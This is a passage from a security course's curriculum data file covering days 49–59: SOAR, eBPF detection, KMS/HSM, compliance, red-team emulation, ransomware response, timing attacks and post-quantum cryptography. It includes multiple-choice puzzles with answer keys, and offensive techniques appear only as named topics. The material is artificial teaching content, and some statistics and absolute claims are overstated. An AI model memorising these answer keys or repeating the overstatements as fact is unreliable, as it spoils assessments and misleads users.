      { id: "sec-m2-d49-q1", name: "SOAR Architecture & RFC 3227 Order of Volatility", type: "concept", desc: "Detail automated playbook DAGs, webhook validation, and evidentiary preservation requirements." },
      { id: "sec-m2-d49-q2", name: "Detective Lab: Auditing Automated SOAR Playbook Execution Logs", type: "detective", desc: "Trace an automated quarantine action that isolated a container, captured memory artifacts, and revoked IAM tokens." },
      { id: "sec-m2-d49-q3", name: "Mastery Assignment: Production Automated Incident Response Playbook Engine", type: "assignment", desc: "Build a TypeScript SOAR webhook dispatcher that automatically applies network isolation rules and triggers forensic snapshots." },
      { id: "sec-m2-d49-q4", name: "Production Incident Lab: Automated Ransomware Blast Radius Containment", type: "detective", desc: "Test a live SOAR playbook that halts an emulated ransomware outbreak within 500 milliseconds of canary tripwire access." }
    ]
  },
  {
    day: 50,
    month: 2,
    blockNum: 10,
    title: "⭐ MILESTONE 9: Automated SOC Detection Pipeline: Sigma Engine + eBPF Kernel Sensor",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Milestone Gate: Kernel Telemetry & Detection Pipeline)",
    spokenGoal: "Assemble Milestone 9: Engineer an end-to-end Automated SOC Detection & Response Pipeline uniting real-time Linux eBPF kernel event streaming, dynamic Sigma rule matching, distributed event correlation, and automated SOAR quarantine dispatchers.",
    conceptInvariant: "Detection-to-Response Pipeline Invariant: A world-class security operations architecture bridges the gap from low-level kernel telemetry to automated remediation with zero human delay: Kernel eBPF Hook -> Structured Event Stream -> Sigma Correlation Engine -> Automated SOAR Containment.",
    failureMode: "Deploying high-volume eBPF sensors directly into production without event batching or kernel filtering, overwhelming the host CPU and causing a self-inflicted denial of service on production database nodes.",
    tryItFriction: "Complete Milestone 9 by constructing a pipeline that streams simulated eBPF process execution events, evaluates them against Sigma rules, detects an anomalous reverse shell, and automatically triggers isolation within 100ms.",
    socraticHints: [
      "How do you prevent eBPF telemetry from overwhelming network bandwidth?",
      "Filter aggressively inside the kernel using eBPF maps so only anomalous or security-relevant events are sent to user space!",
      "Process events through an in-memory stream buffer and dispatch SOAR webhooks when rule conditions match."
    ],
    situationalPuzzle: {
      scenario: "During a high-throughput load test, your SOC detection pipeline experiences a 10-second processing delay. An attacker executes a privilege escalation exploit during this delay window and deletes the database before the automated quarantine fires. What pipeline architectural upgrade is required?",
      options: [
        "Delete the eBPF sensors.",
        "In-Kernel Enforcement vs User-Space Alerting: Passive user-space alerting is always subject to pipeline queuing latency. Critical security invariants (e.g. blocking unauthorized setuid calls or unauthorized socket connections) must be enforced directly in-kernel using eBPF LSM (Linux Security Modules) hooks that block the syscall synchronously.",
        "Switch to manual human monitoring.",
        "Disable database access for all services."
      ],
      answerIdx: 1,
      debrief: "For critical threats, passive asynchronous detection is too slow. Modern security architectures leverage BPF-LSM (Linux Security Modules), allowing eBPF programs to synchronously return `-EPERM` directly inside the kernel, blocking unauthorized actions before the syscall completes."
    },
    quests: [
      { id: "sec-m2-d50-q1", name: "Milestone 9 Architecture: Real-Time Kernel Security Pipeline", type: "concept", desc: "Design a sub-millisecond pipeline from eBPF kernel probes to user-space correlation and SOAR remediation." },
      { id: "sec-m2-d50-q2", name: "Detective Lab: Auditing Event Pipeline Throughput & Latency Bottlenecks", type: "detective", desc: "Profile pipeline latency under 100,000 events/sec and optimize ring buffer ingestion to eliminate telemetry drops." },
      { id: "sec-m2-d50-q3", name: "Mastery Assignment: Full End-to-End SOC Detection & SOAR Enforcement Engine", type: "assignment", desc: "Build a TypeScript detection engine evaluating streaming eBPF events against Sigma rules with automated quarantine execution." },
      { id: "sec-m2-d50-q4", name: "Production Incident Lab: Live In-Flight Attack Neutralization Simulation", type: "detective", desc: "Verify that an active live attack simulation is detected and completely quarantined in under 100 milliseconds." }
    ]
  },

  // ─── BLOCK 11: Compliance, Red Teaming & SRE War Rooms (Days 51–55) ─────────────
  {
    day: 51,
    month: 2,
    blockNum: 11,
    title: "Cryptographic Key Management: HSMs, Cloud KMS, Key Rotation & Secure Zeroization",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Hardware Security Modules & Key Lifecycles)",
    spokenGoal: "Operate enterprise cryptographic key infrastructure: study FIPS 140-2/3 Level 3 Hardware Security Modules (HSM), Cloud KMS architecture, asymmetric key ceremony protocols, automated cryptographic key rotation, and memory zeroization.",
    conceptInvariant: "Cryptographic Non-Exportability Invariant: Root master keys must NEVER leave the physical cryptographic boundary of a certified Hardware Security Module (HSM). Cryptographic operations (signing, decryption) are performed inside the tamper-resistant hardware chip; the private key material cannot be extracted even by root administrators.",
    failureMode: "Exporting an unencrypted master private key to an environment variable in a Kubernetes pod config, allowing any developer with pod read permissions to copy the private key.",
    tryItFriction: "Implement an automated key rotation orchestrator in TypeScript that provisions a new KMS key version, transitions previous versions to decrypt-only state, and tracks re-encryption progress across existing encrypted records.",
    socraticHints: [
      "What is the difference between an active key and a decrypt-only key during key rotation?",
      "New data is encrypted exclusively with the latest active key version, but older keys must remain available to decrypt existing legacy data!",
      "Never destroy an older key version until all historical records have been re-encrypted with the new key version."
    ],
    situationalPuzzle: {
      scenario: "An enterprise uses AWS KMS with an HSM backing. A rogue system administrator with full AWS root access attempts to steal the root private key to decrypt company data offline. Why is the root administrator unable to download the private key?",
      options: [
        "AWS root accounts cannot make API calls.",
        "HSM Physical Tamper-Resistance & Non-Exportable Keys: FIPS 140-2 Level 3 HSMs physically disallow private key export in plaintext. The cryptographic API only exposes `kms:Encrypt` and `kms:Decrypt`; the actual private key bits never leave the silicon chip and will physically self-destruct (zeroize) if the hardware enclosure is tampered with.",
        "The key is protected by a password the admin doesn't know.",
        "KMS keys are stored on paper in a safe."
      ],
      answerIdx: 1,
      debrief: "Hardware Security Modules provide true non-exportability. Even an administrator with root cloud credentials cannot extract the underlying private key bits; they can only invoke cryptographic operations through the HSM interface, which emits tamper-evident audit logs."
    },
    quests: [
      { id: "sec-m2-d51-q1", name: "FIPS 140-3 Levels 1–4 & HSM Physical Security Architecture", type: "concept", desc: "Detail physical tamper envelope switches, zeroization circuitry, dual-control key ceremonies, and m-of-n splits." },
      { id: "sec-m2-d51-q2", name: "Detective Lab: Auditing Cloud KMS Key Policies for Excessive Decrypt Rights", type: "detective", desc: "Audit AWS KMS key policy JSONs to detect overly permissive principals capable of decrypting production secrets." },
      { id: "sec-m2-d51-q3", name: "Mastery Assignment: Production KMS Client with Ephemeral DEK Caching & Zeroization", type: "assignment", desc: "Implement a TypeScript envelope client interacting with KMS that caches DEKs securely and wipes memory buffers on release." },
      { id: "sec-m2-d51-q4", name: "Production Incident Lab: Emergency Key Compromise Revocation & Fleet Re-Keying", type: "detective", desc: "Execute an emergency key disablement and re-encryption workflow after an alleged master key compromise." }
    ]
  },
  {
    day: 52,
    month: 2,
    blockNum: 11,
    title: "Regulatory Compliance as Code: SOC 2 Type II, ISO 27001 & Automated OpenSCAP Audits",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Compliance as Code & Security Governance)",
    spokenGoal: "Transform manual security audits into automated Continuous Compliance as Code: understand SOC 2 Type II Trust Services Criteria (Security, Availability, Confidentiality), ISO/IEC 27001 ISMS controls, PCI-DSS 4.0 requirements, and automate compliance audits using OpenSCAP and InSpec.",
    conceptInvariant: "Continuous Compliance Invariant: Compliance is not an annual screenshot exercise; it is an invariant enforced continuously in code. Any drift from compliance baselines (e.g., an S3 bucket becoming publicly readable, or an unencrypted database volume) must be detected and automatically remediated within seconds.",
    failureMode: "Manually taking screenshots of cloud dashboards once a year for auditors, while a misconfigured Terraform change quietly opened a production database port to `0.0.0.0/0` three months ago without anyone noticing.",
    tryItFriction: "Write an automated compliance linter in TypeScript that inspects live infrastructure state against SOC 2 controls, generates compliance pass/fail matrices, and triggers alert webhooks on configuration drift.",
    socraticHints: [
      "What is the difference between SOC 2 Type I and Type II?",
      "Type I evaluates whether security controls were DESIGNED properly on a single day; Type II evaluates whether controls OPERATED EFFECTIVELY over a 6 to 12-month period!",
      "Automate continuous evidence collection so compliance is proven mathematically every single day."
    ],
    situationalPuzzle: {
      scenario: "During a SOC 2 Type II audit, the auditor requests evidence that all production database changes in the last 12 months had two-party peer review before deployment. How does a modern engineering team prove this mathematically without manual screenshots?",
      options: [
        "Ask developers to write affidavits confirming they reviewed PRs.",
        "Cryptographic Audit Trail via GitHub Branch Protections: The team exports signed git commit logs, GitHub branch protection rule enforcement histories, and pull request approval metadata proving that `require_pull_request_reviews` was enforced programmatically with zero administrative bypasses.",
        "Tell the auditor that SOC 2 does not require peer reviews.",
        "Print out 10,000 pages of git diffs."
      ],
      answerIdx: 1,
      debrief: "Modern compliance relies on programmatic controls. Branch protection rules, required pull request reviews, and automated deployment pipelines provide cryptographically verifiable proof of two-party authorization for every production deployment."
    },
    quests: [
      { id: "sec-m2-d52-q1", name: "Compliance Frameworks: SOC 2 vs ISO 27001 vs PCI-DSS 4.0", type: "concept", desc: "Map Common Criteria (CC6.1-CC6.8) access controls and encryption mandates across international standards." },
      { id: "sec-m2-d52-q2", name: "Detective Lab: Auditing Cloud Drift with OpenSCAP / CloudQuery", type: "detective", desc: "Run continuous configuration scans across infrastructure to flag non-compliant storage buckets and unencrypted disks." },
      { id: "sec-m2-d52-q3", name: "Mastery Assignment: Compliance-as-Code Policy Engine in TypeScript", type: "assignment", desc: "Build a policy evaluation tool verifying CIS benchmarks and generating automated SOC 2 audit reports in JSON/Markdown." },
      { id: "sec-m2-d52-q4", name: "Production Incident Lab: Automated Remediation of Publicly Exposed Database", type: "detective", desc: "Trigger an automated compliance remediation bot that instantly revokes public security group rules and notifies security." }
    ]
  },
  {
    day: 53,
    month: 2,
    blockNum: 11,
    title: "Red Team Adversary Emulation: Atomic Red Team, C2 Frameworks & Lateral Movement",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Adversary Emulation & Offensive Operations)",
    spokenGoal: "Think like a nation-state adversary: execute structured adversary emulation using Atomic Red Team, analyze Command and Control (C2) frameworks (Mythic, Sliver), explore lateral movement techniques (Pass-the-Hash, WMI/WinRM, SSH key harvesting), and test defensive detection efficacy.",
    conceptInvariant: "Purple Teaming Validation Invariant: A defensive control that has never been tested against an actual offensive exploit is an unverified assumption. Adversary emulation systematically executes atomic tests matching real threat actor procedures to validate that SIEM, EDR, and SOAR pipelines trigger as designed.",
    failureMode: "Assuming an EDR tool detects credential dumping without testing it, only to discover during a real ransomware attack that the EDR agent was running with default passive settings that ignored LSASS memory dumping.",
    tryItFriction: "Execute an automated Atomic Red Team test that performs simulated process injection and token impersonation, and verify that your EDR sensor captures the exact ATT&CK technique (T1055).",
    socraticHints: [
      "What is Purple Teaming?",
      "The tight collaborative loop where the Red Team (attackers) executes atomic techniques and the Blue Team (defenders) tunes detection rules in real-time!",
      "Execute the technique, verify the telemetry in the SIEM, write the Sigma rule, and re-test to confirm 100% detection."
    ],
    situationalPuzzle: {
      scenario: "During an adversary emulation exercise, the red team compromises an internal build server. They search `~/.ssh/` and find an unencrypted private key that has SSH access to all production database nodes. What defense-in-depth architectural control should have stopped lateral movement even with the stolen key?",
      options: [
        "Deleting SSH from the database nodes.",
        "Bastion Host & Ephemeral Certificate Enforcement: Direct SSH to database nodes should be completely disabled at the network firewall. Administrative access must require an Identity-Aware Bastion (Teleport / AWS SSM) issuing short-lived, hardware-bound SSH certificates with mandatory step-up MFA.",
        "Renaming the SSH key to a hidden file.",
        "Using Telnet instead of SSH."
      ],
      answerIdx: 1,
      debrief: "Static, unencrypted SSH keys on developer or build servers are a massive lateral movement risk. Hardened systems replace static keys with certificate-based access proxies (Teleport / HashiCorp Boundary / AWS SSM) requiring real-time MFA and zero direct Layer 3 network connectivity."
    },
    quests: [
      { id: "sec-m2-d53-q1", name: "C2 Framework Architecture: Beaconing, Sleep Jitter & Protocols", type: "concept", desc: "Analyze HTTPS/DNS beaconing, malleable C2 profiles, domain fronting, and lateral movement tradecraft." },
      { id: "sec-m2-d53-q2", name: "Detective Lab: Running Atomic Red Team Tests for Credential Access", type: "detective", desc: "Execute atomic test procedures simulating credential dumping (T1003) and verify telemetry capture in endpoint logs." },
      { id: "sec-m2-d53-q3", name: "Mastery Assignment: Automated Purple Team Detection Verification Runner", type: "assignment", desc: "Build a TypeScript test harness that triggers simulated attack events and validates that SIEM alerts fire within SLAs." },
      { id: "sec-m2-d53-q4", name: "Production Incident Lab: Unannounced Red Team Campaign Triage & Containment", type: "detective", desc: "Conduct active defensive operations against an unannounced simulated red-team breach targeting payment pipelines." }
    ]
  },
  {
    day: 54,
    month: 2,
    blockNum: 11,
    title: "SRE 3 AM Security Incident War Rooms: Ransomware Outbreak Triage & Active Exfiltration",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (High-Stress Crisis Triage & Forensic Incident Response)",
    spokenGoal: "Lead a high-stakes 3 AM Security Incident War Room: triage active ransomware outbreaks encrypting production filesystems, stop active data exfiltration over covert channels (DNS tunneling, cloud storage), coordinate executive crisis communications, and execute emergency containment runbooks.",
    conceptInvariant: "Containment Precedence Invariant: In an active security incident, halting further damage (isolation) takes absolute precedence over determining root cause. If data is actively being encrypted or exfiltrated, sever network egress immediately before initiating detailed log analysis or forensic attribution.",
    failureMode: "Spending 4 hours reading server access logs to identify how an attacker got in, while the attacker's automated script continues encrypting 20 servers per minute across the rest of the company.",
    tryItFriction: "Lead a simulated 3 AM war room: triage simultaneous alerts indicating mass file modifications, execute an immediate cloud network isolate action, and verify that offline immutable backups (S3 Object Lock) are uncorrupted.",
    socraticHints: [
      "What is the first action when ransomware is detected on a production cluster?",
      "Isolate the affected network segments immediately to prevent lateral propagation to other nodes!",
      "Verify that backup repositories are air-gapped or immutable so the attacker cannot delete disaster recovery snapshots."
    ],
    situationalPuzzle: {
      scenario: "At 3:15 AM, the security on-call is paged: database servers are writing encrypted `.locked` files at 100 MB/s, and an extortion note appears. An executive shouts: 'Just restore from last night's database backup!' The SRE checks the backup repository and discovers that the attacker logged into the backup console 2 hours earlier and deleted all snapshots. What critical backup architecture was missing?",
      options: [
        "The backups needed to be zipped.",
        "Immutable Air-Gapped WORM Backups (S3 Object Lock Compliance Mode): Backups must be stored with WORM (Write-Once, Read-Many) immutability and multi-party governance locks in a separate AWS account with separate credentials. Even a root administrator cannot delete or overwrite snapshots until the retention period expires.",
        "Backups should be stored on floppy disks.",
        "The database should not have had backups."
      ],
      answerIdx: 1,
      debrief: "Modern ransomware attackers deliberately target backup systems first before deploying encryptors. Immutable storage (AWS S3 Object Lock in Compliance Mode) ensures that even an attacker with root administrative credentials cannot delete or encrypt backups."
    },
    quests: [
      { id: "sec-m2-d54-q1", name: "Incident Command System (ICS) & 3 AM War Room Protocols", type: "concept", desc: "Detail Incident Commander roles, communications leads, scribe responsibilities, and containment decision matrices." },
      { id: "sec-m2-d54-q2", name: "Detective Lab: Forensic Analysis of Covert DNS Tunneling Exfiltration", type: "detective", desc: "Analyze high-entropy base32 DNS queries exfiltrating customer database records over UDP port 53." },
      { id: "sec-m2-d54-q3", name: "Mastery Assignment: Emergency Containment Automation CLI Tool", type: "assignment", desc: "Build a TypeScript CLI enabling incident commanders to revoke all IAM sessions, isolate VPC subnets, and trigger immutable snapshots." },
      { id: "sec-m2-d54-q4", name: "Production Incident Lab: Live 3 AM Ransomware Incident Simulation", type: "detective", desc: "Navigate a high-pressure live simulation: halt active ransomware encryption, preserve volatile RAM, and execute recovery." }
    ]
  },
  {
    day: 55,
    month: 2,
    blockNum: 11,
    title: "⭐ MILESTONE 10: Enterprise SOC War Room & Incident Forensics Platform (Live Ransomware & Exfiltration)",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Milestone Gate: Incident Command & Forensics Platform)",
    spokenGoal: "Assemble Milestone 10: Deliver a full-scale Enterprise SOC War Room & Incident Forensics Platform: integrate automated containment triggers, volatile memory acquisition, immutable WORM backup verification, and multi-channel incident communication dashboards.",
    conceptInvariant: "Resilient Incident Lifecycle Invariant: Enterprise resilience is measured by the complete lifecycle: Preparation -> Detection -> Containment -> Eradication -> Recovery -> Lessons Learned. The platform must orchestrate all six phases with automated runbooks and verifiable evidentiary integrity.",
    failureMode: "Restoring an unpatched database from backup directly onto the same compromised network without patching the initial access vulnerability, resulting in the attacker re-encrypting the restored database 10 minutes later.",
    tryItFriction: "Complete Milestone 10 by deploying an incident orchestration engine that automatically calculates attack blast radius, quarantines compromised nodes, and verifies clean-room recovery environments before cutover.",
    socraticHints: [
      "Why must recovery occur in a clean-room environment?",
      "Because restoring onto an unverified network risks persistence backdoors and unpatched zero-days reinfecting the system!",
      "Provision fresh, immutable infrastructure via Terraform, apply patches, and restore data from verified clean immutable snapshots."
    ],
    situationalPuzzle: {
      scenario: "Following the resolution of a major breach, legal counsel asks for the exact timeline of events and proof that evidence collected from servers was not altered during forensic analysis. What cryptographic standard guarantees evidentiary integrity in court?",
      options: [
        "A sworn statement by the IT manager.",
        "Cryptographic Chain of Custody & Dual-Hash Evidence Records: Digital forensic images must be hashed immediately upon acquisition using two distinct algorithms (SHA-256 and SHA-512). Any subsequent access is logged, and the hash of the analyzed copy must match the original acquisition hash verbatim.",
        "Taking a photograph of the server monitor.",
        "Storing the hard drives in a wooden box."
      ],
      answerIdx: 1,
      debrief: "Digital forensics requires a strict cryptographic chain of custody. Verifying dual-algorithm hashes (SHA-256 + SHA-512) upon acquisition and proving that analyzed working copies match the original bitstream image ensures evidence admissibility."
    },
    quests: [
      { id: "sec-m2-d55-q1", name: "Milestone 10 Architecture: Enterprise Security Orchestration Platform", type: "concept", desc: "Design a comprehensive incident response and digital forensics orchestration architecture." },
      { id: "sec-m2-d55-q2", name: "Detective Lab: Validating Cryptographic Chain of Custody for Disk Images", type: "detective", desc: "Verify SHA-256 / SHA-512 hash matches across forensic disk images and generate evidentiary audit reports." },
      { id: "sec-m2-d55-q3", name: "Mastery Assignment: Production Incident Command & Blast Radius Engine", type: "assignment", desc: "Build a TypeScript platform calculating breach blast radius, dispatching containment webhooks, and tracking recovery status." },
      { id: "sec-m2-d55-q4", name: "Production Incident Lab: Full Enterprise Breach Simulation & Recovery Sign-Off", type: "detective", desc: "Successfully command an end-to-end simulated enterprise breach from initial detection through post-mortem sign-off." }
    ]
  },

  // ─── BLOCK 12: Advanced Systems Defense & Master Capstone Viva (Days 56–60) ─────
  {
    day: 56,
    month: 2,
    blockNum: 12,
    title: "Side-Channel Attacks: Timing Attacks on String Comparisons & Cache Timing",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Microarchitectural & Timing Side Channels)",
    spokenGoal: "Neutralize microarchitectural side-channel attacks: explore how string comparison operators (`===`) leak information via early-exit execution timing, analyze CPU hardware cache-timing attacks (Spectre, Meltdown, Flush+Reload), and enforce constant-time cryptographic algorithms (`timingSafeEqual`).",
    conceptInvariant: "Constant-Time Execution Invariant: Cryptographic operations and sensitive token verifications must execute in strictly constant time ($O(1)$ CPU cycles) regardless of input validity or matching character prefix. Any data-dependent branch or early-return allows an attacker to deduce secret bytes by measuring nanosecond timing differences.",
    failureMode: "Comparing API keys or password hashes with standard `if (secret === userToken)`: standard string comparisons terminate on the first mismatched character. An attacker measures response latency over 100,000 requests to deduce the secret character-by-character.",
    tryItFriction: "Write a high-precision latency testing harness in TypeScript that measures microsecond differences in naive string comparison, and replace it with `crypto.timingSafeEqual()` to achieve flat constant-time latency.",
    socraticHints: [
      "Why does `\"password\" === \"pAAAAAAA\"` take longer than `\"password\" === \"AAAAAAAA\"` in naive code?",
      "Because the comparison loop checks the first character, finds a match ('p' == 'p'), and continues to the second character before failing!",
      "An attacker measures this small delay to discover that the first character was correct."
    ],
    situationalPuzzle: {
      scenario: "A developer fixes a timing attack by using `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))`. However, if `a.length !== b.length`, the function throws an error immediately. An attacker sends tokens of varying lengths (1 to 64 bytes) and determines the exact length of the secret key based on whether an error was thrown. How should the developer fix this length leak?",
      options: [
        "Ignore it because knowing the key length doesn't help an attacker.",
        "Constant-Length Hash Normalization: Hash both inputs with SHA-256 before comparing (`crypto.timingSafeEqual(sha256(a), sha256(b))`). Because SHA-256 digests are ALWAYS exactly 32 bytes, the buffers are always equal length, eliminating both the timing leak and the length leak.",
        "Pad the buffers with random strings.",
        "Disable API keys entirely."
      ],
      answerIdx: 1,
      debrief: "`timingSafeEqual` requires buffers of identical length. If length differs, comparing hashes of the inputs (`SHA-256(a)` vs `SHA-256(b)`) guarantees both buffers are precisely 32 bytes, neutralizing both character-timing and length-leakage attacks."
    },
    quests: [
      { id: "sec-m2-d56-q1", name: "Microarchitectural Attacks: Spectre, Meltdown & Cache Eviction", type: "concept", desc: "Analyze speculative execution branch predictors, cache line timing (Flush+Reload), and kernel page table isolation (KPTI)." },
      { id: "sec-m2-d56-q2", name: "Detective Lab: Exploiting Sub-Microsecond Remote Timing Differences", type: "detective", desc: "Build a statistical timing analysis tool demonstrating byte-by-byte secret extraction over a local network." },
      { id: "sec-m2-d56-q3", name: "Mastery Assignment: Constant-Time Cryptographic Comparison Module", type: "assignment", desc: "Implement a TypeScript security utility providing constant-time string and buffer comparison with SHA-256 length masking." },
      { id: "sec-m2-d56-q4", name: "Production Incident Lab: Cryptographic Key Leak via Side-Channel Telemetry", type: "detective", desc: "Triage a security advisory where high-resolution performance metrics inadvertently exposed HMAC key lengths." }
    ]
  },
  {
    day: 57,
    month: 2,
    blockNum: 12,
    title: "Quantum-Resistant Cryptography: Post-Quantum Cryptography (NIST PQC) & ML-KEM/Kyber",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Post-Quantum Cryptography & Quantum Threat Models)",
    spokenGoal: "Prepare systems for the Post-Quantum era: understand how Shor's algorithm running on a cryptographically relevant quantum computer will break RSA and ECC (ECDH, Ed25519), explore Grover's algorithm impact on symmetric ciphers, and implement NIST Post-Quantum Cryptography standards (ML-KEM / Kyber for key encapsulation and ML-DSA / Dilithium for digital signatures).",
    conceptInvariant: "Harvest Now, Decrypt Later (HNDL) Invariant: Adversaries are actively intercepting and storing encrypted enterprise and state secrets today, intending to decrypt them once large-scale quantum computers arrive. Encrypting high-value long-term data with post-quantum hybrid key encapsulation (X25519 + ML-KEM) is mandatory today, not in 2035.",
    failureMode: "Relying purely on RSA-2048 or ECDH for encrypting 30-year medical or financial archives, allowing an adversary to record the ciphertexts today and decrypt every patient record when quantum hardware matures.",
    tryItFriction: "Implement a hybrid post-quantum key exchange in TypeScript combining classical X25519 with lattice-based ML-KEM (Kyber-768), ensuring confidentiality even if one of the two algorithms is broken.",
    socraticHints: [
      "Why is 'Hybrid Post-Quantum' recommended rather than pure PQC?",
      "Because classical algorithms (X25519) are battle-tested against classical attacks, while PQC (ML-KEM) provides quantum resistance!",
      "Combine both: derive the master secret from `X25519_secret || ML_KEM_secret` using HKDF."
    ],
    situationalPuzzle: {
      scenario: "A developer asks: 'Will quantum computers break AES-256 symmetric encryption the same way they break RSA?' How do you answer as a Staff Cryptographic Architect?",
      options: [
        "Yes, quantum computers break all encryption instantly.",
        "Shor's vs Grover's Algorithm Distinction: Shor's algorithm provides exponential speedup against public-key cryptography (RSA, ECC), rendering them completely broken. Grover's algorithm only provides quadratic speedup ($\\sqrt{N}$) against symmetric ciphers, effectively reducing AES-256 security to 128 bits—which remains computationally unbreakable.",
        "No, quantum computers only affect Wi-Fi signals.",
        "AES-256 will be replaced by MD5."
      ],
      answerIdx: 1,
      debrief: "Shor's algorithm breaks RSA and ECC because it solves prime factorization and discrete logarithms in polynomial time. Grover's algorithm only searches unstructured spaces with quadratic speedup; AES-256 drops to 128 bits of quantum security, which is still astronomically secure."
    },
    quests: [
      { id: "sec-m2-d57-q1", name: "Shor's Algorithm, Grover's Algorithm & Lattice-Based Cryptography", type: "concept", desc: "Detail mathematical hardness of Learning With Errors (LWE) over module lattices versus discrete logarithms." },
      { id: "sec-m2-d57-q2", name: "Detective Lab: Auditing Infrastructure for Harvest Now Decrypt Later Risks", type: "detective", desc: "Catalog all organizational data retention policies exceeding 7 years and flag all non-PQC encrypted archives." },
      { id: "sec-m2-d57-q3", name: "Mastery Assignment: Post-Quantum Hybrid Key Encapsulation (X25519 + Kyber-768)", type: "assignment", desc: "Implement a TypeScript post-quantum hybrid KEM deriving symmetric keys via HKDF from classical and lattice secrets." },
      { id: "sec-m2-d57-q4", name: "Production Incident Lab: Transitioning Enterprise TLS to Hybrid PQC Ciphers", type: "detective", desc: "Deploy and benchmark hybrid X25519+MLKEM768 cipher suites in edge proxies to measure TLS handshake latency impact." }
    ]
  },
  {
    day: 58,
    month: 2,
    blockNum: 12,
    title: "Staff Security RFC & Architectural Review Board (ARB): Threat Model Defense",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Staff Architectural Leadership & Risk Governance)",
    spokenGoal: "Operate as a Staff Security Architect: author an enterprise Security RFC (Request for Comments), establish residual risk acceptance matrices, navigate trade-offs between user friction and defense-in-depth, and defend architectural proposals before an executive Architectural Review Board (ARB).",
    conceptInvariant: "Residual Risk Transparency Invariant: Zero risk does not exist in production engineering. A Staff Security RFC does not pretend to eliminate all risk; it makes risks explicit, quantifies residual exposure, documents accepted trade-offs, and defines verifiable mitigation invariants agreed upon by engineering and executive leadership.",
    failureMode: "Mandating security controls that add 15 seconds of latency and 4 MFA prompts to every user interaction, causing developers and customers to actively seek workarounds and disable security protections.",
    tryItFriction: "Draft a comprehensive Staff Security RFC proposing an enterprise-wide migration to Zero-Trust SPIFFE/SPIRE mTLS and FIDO2 WebAuthn, complete with cost-benefit analysis, rollout phases, and failure modes.",
    socraticHints: [
      "What are the core components of a Staff Security RFC?",
      "Context & Motivation, Threat Model (STRIDE), Proposed Architecture, Security Invariants, Failure Modes & Mitigations, Rollout/Rollback Plan, and Unresolved Questions.",
      "Defend the business trade-off: explain how the proposed security architecture increases developer velocity and prevents catastrophic downtime."
    ],
    situationalPuzzle: {
      scenario: "During an Architectural Review Board meeting, the VP of Product pushes back against mandating WebAuthn hardware keys for internal staff, arguing that it will slow down onboarding. How do you defend the mandate as a Staff Security Architect?",
      options: [
        "Threaten to resign if it isn't approved.",
        "Quantitative Risk & Business Impact Defense: Present empirical threat intelligence proving that credential phishing accounts for 80% of enterprise breaches with an average breach cost of $4.5M. Demonstrate that WebAuthn hardware keys reduce login friction to a single biometric touch while mathematically eliminating phishing, saving both onboarding time and catastrophic breach exposure.",
        "Agree to drop all authentication requirements.",
        "Tell the VP that security doesn't care about business goals."
      ],
      answerIdx: 1,
      debrief: "Staff architects communicate in terms of business impact, empirical risk data, and developer ergonomics. Demonstrating that modern security controls (WebAuthn) actually improve user experience while eliminating high-probability, high-impact risks wins executive approval."
    },
    quests: [
      { id: "sec-m2-d58-q1", name: "Staff RFC Structure: Threat Models, Trade-offs & Invariants", type: "concept", desc: "Detail RFC sections, risk matrices (Likelihood vs Impact), and security non-negotiables." },
      { id: "sec-m2-d58-q2", name: "Detective Lab: Auditing Engineering RFCs for Unstated Security Flaws", type: "detective", desc: "Review a proposal for a new cross-cloud data sync engine and identify 4 missing cryptographic and authorization invariants." },
      { id: "sec-m2-d58-q3", name: "Mastery Assignment: Authoring a Staff Security Architectural RFC", type: "assignment", desc: "Write a publication-grade Security RFC for an enterprise sovereign security platform ready for ARB presentation." },
      { id: "sec-m2-d58-q4", name: "Production Incident Lab: Defending Architecture during Executive Post-Mortem", type: "detective", desc: "Lead an executive post-mortem review following a security incident, presenting root causes and architectural roadmap fixes." }
    ]
  },
  {
    day: 59,
    month: 2,
    blockNum: 12,
    title: "Production Hardening Audit: Static Code Analysis, Dynamic Fuzzing & Chaos Testing",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Chaos Security Engineering & Coverage-Guided Fuzzing)",
    spokenGoal: "Stress-test systems before attackers do: integrate coverage-guided dynamic fuzzing (AFL++, LibFuzzer), execute security chaos engineering (simulated credential revocation, network partition, node compromise), and perform end-to-end production hardening audits.",
    conceptInvariant: "Fuzzing Invariant: Hand-written test suites only test inputs that developers anticipated. Coverage-guided fuzzing mutates inputs millions of times per second, exploring unexpected execution paths through binary and network parsers to uncover edge-case crashes, memory corruption, and unhandled exceptions that humans cannot foresee.",
    failureMode: "Assuming an internal JSON/protobuf parser is secure because it has 100% unit test coverage, while a coverage-guided fuzzer crashes the service within 30 seconds by generating deeply nested recursive JSON brackets that trigger stack overflow.",
    tryItFriction: "Configure a LibFuzzer / Jazzer fuzzing target for an API parsing function in TypeScript/Rust: run 500,000 iterations and identify the exact malformed input sequence that causes unhandled process termination.",
    socraticHints: [
      "How does coverage-guided fuzzing differ from random fuzzing?",
      "Random fuzzing throws arbitrary garbage; coverage-guided fuzzing monitors which code branches were executed and mutates inputs specifically to explore NEW branches!",
      "Write fuzz targets that accept arbitrary byte buffers and feed them to parsing routines."
    ],
    situationalPuzzle: {
      scenario: "A security team introduces Security Chaos Engineering by automatically injecting expired TLS certificates and revoking KMS master keys in staging. 40% of the microservices fail to recover and hang indefinitely. Why is uncovering this failure in staging considered a major security victory?",
      options: [
        "It proves that staging should be shut down.",
        "Resilience & Anti-Fragility Discovery: A security control that causes unrecoverable deadlocks during rotation or outage will inevitably cause catastrophic production downtime during a real incident. Discovering failure modes under chaos testing allows engineers to build self-healing fallback loops before an actual outage.",
        "Microservices are not designed to recover from errors.",
        "TLS certificates should never expire."
      ],
      answerIdx: 1,
